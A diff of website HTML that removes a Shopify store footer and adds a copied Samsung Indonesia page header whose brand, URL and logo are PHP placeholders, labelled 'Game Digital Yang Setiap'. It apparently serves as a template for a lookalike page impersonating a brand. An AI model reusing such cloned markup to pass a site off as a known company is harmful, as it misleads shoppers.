-                    </div>
-                    <div class="footer__content-bottom">
-                      <div class="footer__content-bottom-wrapper ">
-                          <div class=" footer__column footer__column--info">
-                            <ul class="ulClassSocialIcon footer__list-social list-unstyled list-social">
-                                <li class="social_icon_footer list-social__item-f">
-                                  <a
-                                      href="https://www.facebook.com/istudiosg" target="_blank" rel="nofollow noopener noreferrer"
-                                      class="social_icon_anchor link list-social__link"
-                                      >
-                                      <svg aria-hidden="true" focusable="false" class="icon icon-facebook" viewBox="0 0 20 20">
-                                        <path fill="currentColor" d="M18 10.049C18 5.603 14.419 2 10 2c-4.419 0-8 3.603-8 8.049C2 14.067 4.925 17.396 8.75 18v-5.624H6.719v-2.328h2.03V8.275c0-2.017 1.195-3.132 3.023-3.132.874 0 1.79.158 1.79.158v1.98h-1.009c-.994 0-1.303.621-1.303 1.258v1.51h2.219l-.355 2.326H11.25V18c3.825-.604 6.75-3.933 6.75-7.951Z"/>
-                                      </svg>
-                                      <span class="visually-hidden">Facebook</span>
-                                  </a>
-                                </li>
-                                <li class="social_icon_footer list-social__item-f">
-                                  <a
-                                      href="https://www.instagram.com/istudiosg/" target="_blank" rel="nofollow noopener noreferrer"
-                                      class="social_icon_anchor link list-social__link"
-                                      >
-                                      <svg aria-hidden="true" focusable="false" class="icon icon-instagram" viewBox="0 0 20 20">
-                                        <path fill="currentColor" fill-rule="evenodd" d="M13.23 3.492c-.84-.037-1.096-.046-3.23-.046-2.144 0-2.39.01-3.238.055-.776.027-1.195.164-1.487.273a2.43 2.43 0 0 0-.912.593 2.486 2.486 0 0 0-.602.922c-.11.282-.238.702-.274 1.486-.046.84-.046 1.095-.046 3.23 0 2.134.01 2.39.046 3.229.004.51.097 1.016.274 1.495.145.365.319.639.602.913.282.282.538.456.92.602.474.176.974.268 1.479.273.848.046 1.103.046 3.238.046 2.134 0 2.39-.01 3.23-.046.784-.036 1.203-.164 1.486-.273.374-.146.648-.329.921-.602.283-.283.447-.548.602-.922.177-.476.27-.979.274-1.486.037-.84.046-1.095.046-3.23 0-2.134-.01-2.39-.055-3.229-.027-.784-.164-1.204-.274-1.495a2.43 2.43 0 0 0-.593-.913 2.604 2.604 0 0 0-.92-.602c-.284-.11-.703-.237-1.488-.273ZM6.697 2.05c.857-.036 1.131-.045 3.302-.045 1.1-.014 2.202.001 3.302.045.664.014 1.321.14 1.943.374a3.968 3.968 0 0 1 1.414.922c.41.397.728.88.93 1.414.23.622.354 1.279.365 1.942C18 7.56 18 7.824 18 10.005c0 2.17-.01 2.444-.046 3.292-.036.858-.173 1.442-.374 1.943-.2.53-.474.976-.92 1.423a3.896 3.896 0 0 1-1.415.922c-.51.191-1.095.337-1.943.374-.857.036-1.122.045-3.302.045-2.171 0-2.445-.009-3.302-.055-.849-.027-1.432-.164-1.943-.364a4.152 4.152 0 0 1-1.414-.922 4.128 4.128 0 0 1-.93-1.423c-.183-.51-.329-1.085-.365-1.943C2.009 12.45 2 12.167 2 10.004c0-2.161 0-2.435.055-3.302.027-.848.164-1.432.365-1.942a4.44 4.44 0 0 1 .92-1.414 4.18 4.18 0 0 1 1.415-.93c.51-.183 1.094-.33 1.943-.366Zm.427 4.806a4.105 4.105 0 1 1 5.805 5.805 4.105 4.105 0 0 1-5.805-5.805Zm1.882 5.371a2.668 2.668 0 1 0 2.042-4.93 2.668 2.668 0 0 0-2.042 4.93Zm5.922-5.942a.958.958 0 1 1-1.355-1.355.958.958 0 0 1 1.355 1.355Z" clip-rule="evenodd"/>
-                                      </svg>
-                                      <span class="visually-hidden">Instagram</span>
-                                  </a>
-                                </li>
-                                <li class="social_icon_footer list-social__item-f">
-                                  <a
-                                      href="https://www.youtube.com/channel/UCIkbIFG01maO7Rs_yW9XkKA/" target="_blank" rel="nofollow noopener noreferrer"
-                                      class="social_icon_anchor link list-social__link"
-                                      >
-                                      <svg aria-hidden="true" focusable="false" class="icon icon-youtube" viewBox="0 0 20 20">
-                                        <path fill="currentColor" d="M18.16 5.87c.34 1.309.34 4.08.34 4.08s0 2.771-.34 4.08a2.125 2.125 0 0 1-1.53 1.53c-1.309.34-6.63.34-6.63.34s-5.321 0-6.63-.34a2.125 2.125 0 0 1-1.53-1.53c-.34-1.309-.34-4.08-.34-4.08s0-2.771.34-4.08a2.173 2.173 0 0 1 1.53-1.53C4.679 4 10 4 10 4s5.321 0 6.63.34a2.173 2.173 0 0 1 1.53 1.53ZM8.3 12.5l4.42-2.55L8.3 7.4v5.1Z"/>
-                                      </svg>
-                                      <span class="visually-hidden">YouTube</span>
-                                  </a>
-                                </li>
-                            </ul>
-                            <div class="footer__payment">
-                                <span class="visually-hidden">Payment methods</span>
-                                <ul class="footerPayment list list-payment">
-                                  <li class="paymenticon list-payment__item">
-                                      <svg class="icon icon--full-color" xmlns="http://www.w3.org/2000/svg" role="img" aria-labelledby="pi-american_express" viewBox="0 0 38 24" width="38" height="24">
-                                        <title id="pi-american_express">American Express</title>
-                                        <path fill="#000" d="M35 0H3C1.3 0 0 1.3 0 3v18c0 1.7 1.4 3 3 3h32c1.7 0 3-1.3 3-3V3c0-1.7-1.4-3-3-3Z" opacity=".07"/>
-                                        <path fill="#006FCF" d="M35 1c1.1 0 2 .9 2 2v18c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V3c0-1.1.9-2 2-2h32Z"/>
-                                        <path fill="#FFF" d="M22.012 19.936v-8.421L37 11.528v2.326l-1.732 1.852L37 17.573v2.375h-2.766l-1.47-1.622-1.46 1.628-9.292-.02Z"/>
-                                        <path fill="#006FCF" d="M23.013 19.012v-6.57h5.572v1.513h-3.768v1.028h3.678v1.488h-3.678v1.01h3.768v1.531h-5.572Z"/>
-                                        <path fill="#006FCF" d="m28.557 19.012 3.083-3.289-3.083-3.282h2.386l1.884 2.083 1.89-2.082H37v.051l-3.017 3.23L37 18.92v.093h-2.307l-1.917-2.103-1.898 2.104h-2.321Z"/>
-                                        <path fill="#FFF" d="M22.71 4.04h3.614l1.269 2.881V4.04h4.46l.77 2.159.771-2.159H37v8.421H19l3.71-8.421Z"/>
-                                        <path fill="#006FCF" d="m23.395 4.955-2.916 6.566h2l.55-1.315h2.98l.55 1.315h2.05l-2.904-6.566h-2.31Zm.25 3.777.875-2.09.873 2.09h-1.748Z"/>
-                                        <path fill="#006FCF" d="M28.581 11.52V4.953l2.811.01L32.84 9l1.456-4.046H37v6.565l-1.74.016v-4.51l-1.644 4.494h-1.59L30.35 7.01v4.51h-1.768Z"/>
-                                      </svg>
-                                  </li>
-                                  <li class="paymenticon list-payment__item">
-                                      <svg class="icon icon--full-color" viewBox="0 0 38 24" xmlns="http://www.w3.org/2000/svg" role="img" width="38" height="24" aria-labelledby="pi-master">
-                                        <title id="pi-master">Mastercard</title>
-                                        <path opacity=".07" d="M35 0H3C1.3 0 0 1.3 0 3v18c0 1.7 1.4 3 3 3h32c1.7 0 3-1.3 3-3V3c0-1.7-1.4-3-3-3z"/>
-                                        <path fill="#fff" d="M35 1c1.1 0 2 .9 2 2v18c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V3c0-1.1.9-2 2-2h32"/>
-                                        <circle fill="#EB001B" cx="15" cy="12" r="7"/>
-                                        <circle fill="#F79E1B" cx="23" cy="12" r="7"/>
-                                        <path fill="#FF5F00" d="M22 12c0-2.4-1.2-4.5-3-5.7-1.8 1.3-3 3.4-3 5.7s1.2 4.5 3 5.7c1.8-1.2 3-3.3 3-5.7z"/>
-                                      </svg>
-                                  </li>
-                                  <li class="paymenticon list-payment__item">
-                                      <svg class="icon icon--full-color" viewBox="0 0 38 24" xmlns="http://www.w3.org/2000/svg" role="img" width="38" height="24" aria-labelledby="pi-visa">
-                                        <title id="pi-visa">Visa</title>
-                                        <path opacity=".07" d="M35 0H3C1.3 0 0 1.3 0 3v18c0 1.7 1.4 3 3 3h32c1.7 0 3-1.3 3-3V3c0-1.7-1.4-3-3-3z"/>
-                                        <path fill="#fff" d="M35 1c1.1 0 2 .9 2 2v18c0 1.1-.9 2-2 2H3c-1.1 0-2-.9-2-2V3c0-1.1.9-2 2-2h32"/>
-                                        <path d="M28.3 10.1H28c-.4 1-.7 1.5-1 3h1.9c-.3-1.5-.3-2.2-.6-3zm2.9 5.9h-1.7c-.1 0-.1 0-.2-.1l-.2-.9-.1-.2h-2.4c-.1 0-.2 0-.2.2l-.3.9c0 .1-.1.1-.1.1h-2.1l.2-.5L27 8.7c0-.5.3-.7.8-.7h1.5c.1 0 .2 0 .2.2l1.4 6.5c.1.4.2.7.2 1.1.1.1.1.1.1.2zm-13.4-.3l.4-1.8c.1 0 .2.1.2.1.7.3 1.4.5 2.1.4.2 0 .5-.1.7-.2.5-.2.5-.7.1-1.1-.2-.2-.5-.3-.8-.5-.4-.2-.8-.4-1.1-.7-1.2-1-.8-2.4-.1-3.1.6-.4.9-.8 1.7-.8 1.2 0 2.5 0 3.1.2h.1c-.1.6-.2 1.1-.4 1.7-.5-.2-1-.4-1.5-.4-.3 0-.6 0-.9.1-.2 0-.3.1-.4.2-.2.2-.2.5 0 .7l.5.4c.4.2.8.4 1.1.6.5.3 1 .8 1.1 1.4.2.9-.1 1.7-.9 2.3-.5.4-.7.6-1.4.6-1.4 0-2.5.1-3.4-.2-.1.2-.1.2-.2.1zm-3.5.3c.1-.7.1-.7.2-1 .5-2.2 1-4.5 1.4-6.7.1-.2.1-.3.3-.3H18c-.2 1.2-.4 2.1-.7 3.2-.3 1.5-.6 3-1 4.5 0 .2-.1.2-.3.2M5 8.2c0-.1.2-.2.3-.2h3.4c.5 0 .9.3 1 .8l.9 4.4c0 .1 0 .1.1.2 0-.1.1-.1.1-.1l2.1-5.1c-.1-.1 0-.2.1-.2h2.1c0 .1 0 .1-.1.2l-3.1 7.3c-.1.2-.1.3-.2.4-.1.1-.3 0-.5 0H9.7c-.1 0-.2 0-.2-.2L7.9 9.5c-.2-.2-.5-.5-.9-.6-.6-.3-1.7-.5-1.9-.5L5 8.2z" fill="#142688"/>
-                                      </svg>
-                                  </li>
-                                  <li class="paymenticon list-payment__item" style='width:auto;'>
-                                      <img src="https://cdn.shopify.com/s/files/1/0637/3864/2612/files/payment_badge_green.png?v=1753250452" height="24">
-                                  </li>
-                                </ul>
-                            </div>
-                            <div class="copyrightCss footer__copyright caption">
-                                <span class="copyright__content"
-                                  >&copy; 2026, <a href="<?= $canonical; ?>" target="_blank" title=""><?= $BRAND; ?></a></span>
-                                <span class="copyright__content"><a target="_blank" rel="nofollow noopener noreferrer" href="https://www.shopify.com?utm_campaign=poweredby&amp;utm_medium=shopify&amp;utm_source=onlinestore">Powered by Shopify</a></span>
-                            </div>
-                          </div>
-                      </div>
-                    </div>
-                </div>
-              </div>
-          </footer>
-          <script>
-              var acc = document.getElementsByClassName('accordion2');
-              var i;
-              $(document).on('click', '.accordion2', function () {
-                this.classList.toggle('active_2');
-                this.classList.toggle('headerBlu');
-                var panel2 = this.nextElementSibling;
-                $(panel2.style.maxHeight);
-                if (panel2.style.maxHeight) {
-                  panel2.style.maxHeight = null;
-                  $(this).find('span').removeClass('svgrotate');
-                } else {
-                  panel2.style.maxHeight = panel2.scrollHeight + 'px';
-                  $(this).find('span').addClass('svgrotate');
-                }
-              });
-          </script>
+</style>
+</head>
+ <body>
+  <div id="wrap">
+   <!-- 공통  hidden input 시작-->
+   <!-- typeAheadDomain 기존 search/ -> 붙이던 부분 삭제함 필요시 search/를 붙여서 사용-->
+   <input id="searchDomain" name="searchDomain" type="hidden" value="//searchapi.samsung.com/v6"/>
+   <input id="esapiSearchDomain" name="esapiSearchDomain" type="hidden" value="https://esapi.samsung.com"/>
+   <input id="scene7domain" name="scene7domain" type="hidden" value="//images.samsung.com/is/image/samsung/"/>
+   <input id="reviewUseYN" name="reviewUseYN" type="hidden" value="Y"/>
+   <input id="aplautYn" name="aplautYn" type="hidden" value="N"/>
+   <input id="reevooUseYN" name="reevooUseYN" type="hidden" value="N"/>
+   <input id="bvFlag" name="bvFlag" type="hidden" value="Y"/>
+   <input id="bvRTLFlag" name="bvRTLFlag" type="hidden" value="N"/>
+   <input id="multiLanguageYn" name="multiLanguageYn" type="hidden" value="N"/>
+   <input id="localLang" name="localLang" type="hidden" value="id-id"/>
+   <input id="runmodeInfo" name="runmodeInfo" type="hidden" value="live"/>
+   <input id="apiStageInfo" name="apiStageInfo" type="hidden" value="front"/>
+   <input id="tempTitle" name="tempTitle" type="hidden" value="page-buying-pd"/>
+   <input id="siteCode" name="siteCode" type="hidden" value="id"/>
+   <input id="store_sitecode" name="store_sitecode" type="hidden" value="id"/>
+   <input id="language" name="language" type="hidden" value="in_ID"/>
+   <input id="serverType" name="serverType" type="hidden" value="prod"/>
+   <input id="gpvStoreDomain" name="gpvStoreDomain" type="hidden" value="https://p1.ecom.samsung.com"/>
+   <input id="storeWebDomain" name="storeWebDomain" type="hidden" value="https://shop.samsung.com"/>
+   <input id="shopIntegrationFlag" name="shopIntegrationFlag" type="hidden" value="Hybris-new"/>
+   <input id="newHyvStoreDomain" name="newHyvStoreDomain" type="hidden"/>
+   <!-- business page 여부 -->
+   <input id="b2bFlag" name="b2bFlag" type="hidden" value="N"/>
+   <input id="pageUrl" name="pageUrl" type="hidden"/>
+   <input id="pathString" name="pathString" type="hidden"/>
+   <input id="wishlistYn" name="wishlistYn" type="hidden"/>
+   <input id="shopParmLang" name="shopParmLang" type="hidden"/>
+   <input id="reservationDomain" name="reservationDomain" type="hidden"/>
+   <!-- 공통  hidden input 끝-->
+   <section class="progress cm-loader" style="display:none;">
+    <div class="progress__wrapper">
+     <div class="progress__circle-1">
+     </div>
+     <div class="progress__circle-2">
+     </div>
+     <div class="progress__circle-3">
+     </div>
+     <div class="progress__circle-4">
+     </div>
+    </div>
+   </section>
+<script src="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-common/global/js/crypto-js.min.6fa2276cf659f30cabde72a6fc452171.js"></script>
+<script src="https://account.samsung.com/resources/libs/account-internal/2.0.0/account-internal.min.js" type="text/javascript"></script>
+   <header id="header" role="banner">
+    <!--googleoff: all-->
+    <div class="skip-bar">
+     <a href="#content" id="skipToContent">
+      Skip to content
+     </a>
+    </div>
+   </header>
+   <div class="newpar new section">
+   </div>
+   <div class="par iparys_inherited">
+   </div>
+   <aside class="nv16-country-selector" style="height: 0px;">
+    <div class="nv16-country-selector__content-wrap">
+     <div class="nv16-country-selector__content">
+      <label class="nv16-country-selector__description" for="countrySelect">
+       Pilih lokasi dan bahasa Anda.
+      </label>
+      <div class="nv16-country-selector__select-contaniner" data-country-codes="uk">
+       <div class="nv16-country-selector__menu">
+        <div class="menu" data-comp-name="menu">
+         <select class="menu__select" id="countrySelect" tabindex="-1">
+          <option data-country-type="sitecd" selected="" value="id">
+           Indonesia / Bahasa Indonesia
+          </option>
+          <option data-country-type="location" value="uk">
+           UK / English
+          </option>
+          <option lang="en" value="other">
+           Other Countries
+          </option>
+         </select>
+         <button an-ac="gnb" an-ca="navigation" an-la="country selector" an-tr="nv16_gnb-country selector-navigation" aria-expanded="false" aria-haspopup="listbox" class="menu__select-field" data-aria-label="Pilih lokasi dan bahasa Anda." type="button">
+          <span class="menu__select-field-text">
+          </span>
+          <svg aria-hidden="true" class="menu__select-field-icon down" focusable="false">
+           <use href="#open-down-bold" xlink:href="#open-down-bold">
+           </use>
+          </svg>
+          <svg aria-hidden="true" class="menu__select-field-icon up" focusable="false">
+           <use href="#close-up-bold" xlink:href="#close-up-bold">
+           </use>
+          </svg>
+         </button>
         </div>
-        <section id="shopify-section-sections--17605520064692__collapsible_content_xjDGLy" class="shopify-section shopify-section-group-footer-group section">
-          <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/component-accordion.css?v=114305622551526091581742784887" rel="stylesheet" type="text/css" media="all" />
-          <link href="https://www.istudiosg.com/cdn/shop/t/14/assets/collapsible-content.css?v=127502585749033803951742784889" rel="stylesheet" type="text/css" media="all" />
-          <style data-shopify>.section-sections--17605520064692__collapsible_content_xjDGLy-padding {
-              padding-top: 27px;
-              padding-bottom: 27px;
-              }
-              @media screen and (min-width: 750px) {
-              .section-sections--17605520064692__collapsible_content_xjDGLy-padding {
-              padding-top: 36px;
-              padding-bottom: 36px;
-              }
-              }
-          </style>
-          <div class="color-background-1 gradient">
-              <div class="collapsible-content collapsible-none-layout isolate content-container content-container--full-width">
-                <div class="collapsible-content__wrapper section-sections--17605520064692__collapsible_content_xjDGLy-padding">
-                    <div class="collapsible-content-wrapper-narrow">
-                      <div
-                          class="collapsible-content__header"
-                          style="text-align: center;"
-                          >
-                          <p class="caption-with-letter-spacing">
-                            Prices include 9% GST but exclude shipping costs.
-                          </p>
-                          <h2 class="visually-hidden">Single column accordion</h2>
-                      </div>
-                      <div class="grid grid--1-col grid--2-col-tablet collapsible-content__grid collapsible-content__grid--reverse">
-                          <div class="grid__item"></div>
-                      </div>
-                    </div>
-                </div>
-              </div>
+       </div>
+       <div class="nv16-country-selector__continue">
+        <button an-ac="gnb" an-ca="navigation" an-la="country selector:continue" an-tr="nv16_gnb-country selector-navigation" class="cta cta--contained cta--black" data-action="countrySelectorContinue">
+         Lanjutkan
+        </button>
+       </div>
+      </div>
+      <button class="nv16-country-selector__close" data-action="countrySelectorClose">
+       <span class="hidden">
+        Tutup
+       </span>
+       <svg aria-hidden="true" class="icon" focusable="false">
+        <use href="#delete-bold" xlink:href="#delete-bold">
+        </use>
+       </svg>
+      </button>
+     </div>
+    </div>
+   </aside>
+   <!--# COD05_Mobile App Download Banner #-->
+   <aside class="cod05-app-banner" style="display:none">
+   </aside>
+   <!--# //COD05_Mobile App Download Banner #-->
+   <input id="st_checked" name="st_checked" type="hidden" value="2025-11-28 05:05:40"/>
+   <input id="cck" name="cck" type="hidden" value="cedc6238tqcf1t4f0vl7g50mc70d6a5a"/>
+   <input id="gPriceCurrency" name="gPriceCurrency" type="hidden" value="IDR"/>
+   <input id="pageTrack" name="pageTrack" type="hidden" value="product detail"/>
+   <nav aria-label="main navigation" class="nv00-gnb-v4 nv00-gnb-v4--text-type" id="component-id" role="navigation">
+    <div class="nv00-gnb-v4__wrap">
+     <div class="nv00-gnb-v4__inner">
+      <div class="nv00-gnb-v4__header">
+       <a an-ac="gnb" an-ca="navigation" an-la="Game Digital Yang Setiap" an-tr="nv00_gnb-product detail-l0-navigation2" aria-label="Game Digital Yang Setiap" class="nv00-gnb-v4__logo" href="<?= $canonical; ?>">
+        <img src="<?= $logo; ?>" alt="" width="200" height="56"/>
+       </a>
+       <div class="nv00-gnb-v4__utility-list nv00-gnb-v4--mobile-only">
+        <button an-ac="gnb" an-ca="navigation" an-la="search" an-tr="nv00_gnb-product detail-l0-navigation2" class="nv00-gnb-v4__utility nv00-gnb-v4__utility-search gnb__search-btn-js" data-js-action="search">
+         <span class="hidden">
+          Cari
+         </span>
+         <svg aria-hidden="true" class="icon" focusable="false" height="96" viewbox="0 0 96 96" width="96">
+          <path d="M85.732,89.269v0L60.479,64.018A36.5,36.5,0,1,1,22.295,2.869,36.5,36.5,0,0,1,64.02,60.483L89.268,85.732l-3.535,3.535ZM36.5,5A31.508,31.508,0,0,0,24.238,65.525,31.508,31.508,0,0,0,48.762,7.476,31.316,31.316,0,0,0,36.5,5Z" transform="translate(3.366 3.366)">
+          </path>
+         </svg>
+         <span aria-hidden="true" class="nv00-gnb-v4__search-text">
+          Cari
+         </span>
+        </button>
+        <a an-ac="gnb" an-ca="navigation" an-la="cart" an-tr="nv00_gnb-product detail-gnb cart icon-navigation6" class="nv00-gnb-v4__utility nv00-gnb-v4__utility-cart nv00-gnb-v4__utility-btn js-global-cart-btn js-has-carturl" data-cart-url="https://shop.samsung.com/id/cart" href="https://shop.samsung.com/id/cart" role="button">
+         <span class="hidden">
+          Troli
+         </span>
+         <svg aria-hidden="true" class="icon" focusable="false" height="96" viewbox="0 0 96 96" width="96">
+          <g clip-path="url(#clip-path)" transform="translate(-625.251 -196)">
+           <path d="M697.237,263.578a10,10,0,1,1-10,10A10,10,0,0,1,697.237,263.578Zm-34.944,0a10,10,0,1,1-10,10A10,10,0,0,1,662.293,263.578Zm34.944,5a5,5,0,1,0,5,5A5,5,0,0,0,697.237,268.578Zm-34.944,0a5,5,0,1,0,5,5A5,5,0,0,0,662.293,268.578ZM638.1,197.25a3.86,3.86,0,0,1,3.6,2.652l.052.184,3.208,12.292h70.036a3.224,3.224,0,0,1,3.192,3.916l-.04.18-9.4,36.292a3.86,3.86,0,0,1-3.46,2.832l-.2.008h-51.1a3.866,3.866,0,0,1-3.6-2.648l-.052-.188-13.192-50.516-11.612,0,0-5Zm74.648,20.128h-66.48l8.672,33.228h49.2Z" transform="translate(0.834 3.75)">
+           </path>
+          </g>
+         </svg>
+         <span aria-live="polite" class="cart-in-number gnb-cart-count" style="display:none;">
+          <span class="hidden">
+           Number of Products :
+          </span>
+         </span>
+        </a>
+        <a an-ac="gnb" an-ca="account" an-la="login" an-tr="nv00_gnb-product detail-account-account" aria-label="Login/Sign-Up" class="nv00-gnb-v4__utility nv00-gnb-v4__utility-user before-login loginBtn" data-js-action="user" data-linkinfo="https://account.samsung.com/accounts/v1/DCGLID/signInGate">
+         <span class="hidden">
+          Login
+         </span>
+         <svg aria-hidden="true" class="icon" focusable="false" height="96" viewbox="0 0 96 96" width="96">
+          <path d="M48,51.5c16.521,0,30.5,13.82,30.5,29.555h0V89A3.5,3.5,0,0,1,75,92.5H21A3.5,3.5,0,0,1,17.5,89h0V81.055C17.5,65.32,31.479,51.5,48,51.5Zm0,5c-13.772,0-25.5,11.595-25.5,24.555h0V87.5h51V81.055c0-12.831-11.494-24.323-25.087-24.552h0Zm0-53A20.5,20.5,0,1,1,27.5,24,20.5,20.5,0,0,1,48,3.5Zm0,5A15.5,15.5,0,1,0,63.5,24,15.5,15.5,0,0,0,48,8.5Z" transform="translate(-0.5 0.5)">
+          </path>
+         </svg>
+        </a>
+        <a class="nv00-gnb-v4__utility nv00-gnb-v4__utility-user after-login js-user-name js-account" data-js-action="user">
+         <span class="hidden">
+          Buka Menu Saya
+         </span>
+         <div class="image nv00-gnb-v4__user-profile js-gnb-afterlogin-image">
+          <img alt="[D] Alternative Text" class="image__main" data-comp-name="image" role="img" src="#"/>
+         </div>
+         <svg aria-hidden="true" class="icon nv00-gnb-v4__user-icon js-gnb-afterlogin-no-image" focusable="false" height="96" viewbox="0 0 96 96" width="96">
+          <path d="M48,51.5c16.521,0,30.5,13.82,30.5,29.555h0V89A3.5,3.5,0,0,1,75,92.5H21A3.5,3.5,0,0,1,17.5,89h0V81.055C17.5,65.32,31.479,51.5,48,51.5Zm0,5c-13.772,0-25.5,11.595-25.5,24.555h0V87.5h51V81.055c0-12.831-11.494-24.323-25.087-24.552h0Zm0-53A20.5,20.5,0,1,1,27.5,24,20.5,20.5,0,0,1,48,3.5Zm0,5A15.5,15.5,0,1,0,63.5,24,15.5,15.5,0,0,0,48,8.5Z" transform="translate(-0.5 0.5)">
+          </path>
+         </svg>
+        </a>
+        <button an-ac="gnb" an-ca="navigation" an-la="gnb:open" an-tr="nv00_gnb-product detail-gnb open / close-navigation2" aria-expanded="false" aria-haspopup="true" class="nv00-gnb-v4__utility nv00-gnb-v4__utility-hamburger" data-js-action="hamburger">
+         <span class="hidden">
+          Navigation
+         </span>
+         <svg aria-hidden="true" class="icon" focusable="false" height="96" viewbox="0 0 96 96" width="96">
+          <path d="M0,57V52H70v5ZM0,31V26H70v5ZM0,5V0H70V5Z" transform="translate(13 20)">
+          </path>
+         </svg>
+        </button>
+       </div>
+      </div>
+      <div class="nv00-gnb-v4__container">
+       <div class="nv00-gnb-v4__container-header nv00-gnb-v4--mobile-only">
+        <button class="nv00-gnb-v4__backward-btn">
+         <span class="hidden">
+          Kembali
+         </span>
+         <svg aria-hidden="true" class="icon" focusable="false">
+          <use href="#previous-regular" xlink:href="#previous-regular">
+          </use>
+         </svg>
+        </button>
+        <button an-ac="gnb" an-ca="navigation" an-la="search" an-tr="nv00_gnb-product detail-l0-navigation5" aria-expanded="false" aria-haspopup="true" class="nv00-gnb-v4__search gnb__search-btn-js" data-js-action="search">
+         <svg aria-hidden="true" class="icon" focusable="false" height="96" viewbox="0 0 96 96" width="96">
+          <path d="M85.732,89.269v0L60.479,64.018A36.5,36.5,0,1,1,22.295,2.869,36.5,36.5,0,0,1,64.02,60.483L89.268,85.732l-3.535,3.535ZM36.5,5A31.508,31.508,0,0,0,24.238,65.525,31.508,31.508,0,0,0,48.762,7.476,31.316,31.316,0,0,0,36.5,5Z" transform="translate(3.366 3.366)">
+          </path>
+         </svg>
+         <span class="nv00-gnb-v4__search-text">
+          Cari
+         </span>
+        </button>
+       </div>
+       <div class="nv00-gnb-v4__container-inner">
+        <div class="nv00-gnb-v4__featured-wrap nv00-gnb-v4--mobile-only">
+         <p class="nv00-gnb-v4__featured-title">
+          FEATURED
+         </p>
+         <div class="nv00-gnb-v4__featured-list swiper-container basic-swiper" data-swiper-option='{
+				"slidesPerView": "auto",
+				"keepWrapper": true,
+				"pagination":true,
+				"offTxtAccesibility": true,
+				"componentEl": ".nv00-gnb-v4"
+			}'>
+          <div class="nv00-gnb-v4__featured-list-inner swiper-wrapper" role="list">
+           <div class="nv00-gnb-v4__featured-item swiper-slide">
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:galaxy z fold7" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-thumb" href="https://www.samsung.com/id/smartphones/galaxy-z-fold7/buy/">
+             <div class="image">
+              <img alt="Galaxy Z Fold7" class="image__preview lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/f2507/gnb/Galaxy-Z_Fold7_GNB_L1_Shop_88x88.png?$LazyLoad_Home_PNG$" role="img"/>
+              <img alt="Galaxy Z Fold7" class="image__main lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/f2507/gnb/Galaxy-Z_Fold7_GNB_L1_Shop_88x88.png?$ORIGIN_PNG$" role="img"/>
+             </div>
+            </a>
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:galaxy z fold7" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-name" href="https://www.samsung.com/id/smartphones/galaxy-z-fold7/buy/">
+             Galaxy Z Fold7
+            </a>
+           </div>
+           <div class="nv00-gnb-v4__featured-item swiper-slide">
+            <span class="badge-icon badge-icon--label badge-icon--bg-color-blue">
+             BARU
+            </span>
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:galaxy s25 fe" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-thumb" href="https://www.samsung.com/id/smartphones/galaxy-s25/buy/?modelCode=SM-S731BDBCXID">
+             <div class="image">
+              <img alt="Galaxy S25 FE" class="image__preview lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/9/gnb/GNB_Shop_S25_FE_88x88.png?$LazyLoad_Home_PNG$" role="img"/>
+              <img alt="Galaxy S25 FE" class="image__main lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/9/gnb/GNB_Shop_S25_FE_88x88.png?$ORIGIN_PNG$" role="img"/>
+             </div>
+            </a>
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:galaxy s25 fe" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-name" href="https://www.samsung.com/id/smartphones/galaxy-s25/buy/?modelCode=SM-S731BDBCXID">
+             Galaxy S25 FE
+            </a>
+           </div>
+           <div class="nv00-gnb-v4__featured-item swiper-slide">
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:galaxy tab s11 series" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-thumb" href="https://www.samsung.com/id/tablets/galaxy-tab-s11/buy/">
+             <div class="image">
+              <img alt="Galaxy Tab S11 Series" class="image__preview lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/9/gnb/GNB_Shop_Tab_S11_88x88.png?$LazyLoad_Home_PNG$" role="img"/>
+              <img alt="Galaxy Tab S11 Series" class="image__main lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/9/gnb/GNB_Shop_Tab_S11_88x88.png?$ORIGIN_PNG$" role="img"/>
+             </div>
+            </a>
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:galaxy tab s11 series" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-name" href="https://www.samsung.com/id/tablets/galaxy-tab-s11/buy/">
+             Galaxy Tab S11
+            </a>
+           </div>
+           <div class="nv00-gnb-v4__featured-item swiper-slide">
+            <a an-ac="gnb" an-ca="navigation" an-la="shop:galaxy watch ultra" an-tr="nv00_gnb-product detail-l1-navigation2" class="nv00-gnb-v4__featured-item-thumb" href="https://www.samsung.com/id/watches/galaxy-watch/galaxy-watch-ultra-2025-47mm-titanium-blue-bluetooth-sm-l700nzb1xse/buy/">
+             <div class="image">
+              <img alt="Galaxy Watch Ultra" class="image__preview lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/8/watch-ultra-blue/GNB_L1_Mobile_Galaxy-Watche_Ultra_88x88-id.png?$LazyLoad_Home_PNG$" role="img"/>
+              <img alt="Galaxy Watch Ultra" class="image__main lazy-load-man" data-comp-name="image" data-src="//images.samsung.com/is/image/samsung/assets/id/offer/2025/8/watch-ultra-blue/GNB_L1_Mobile_Galaxy-Watche_Ultra_88x88-id.png?$ORIGIN_PNG$" role="img"/>
+             </div>
+            </a>
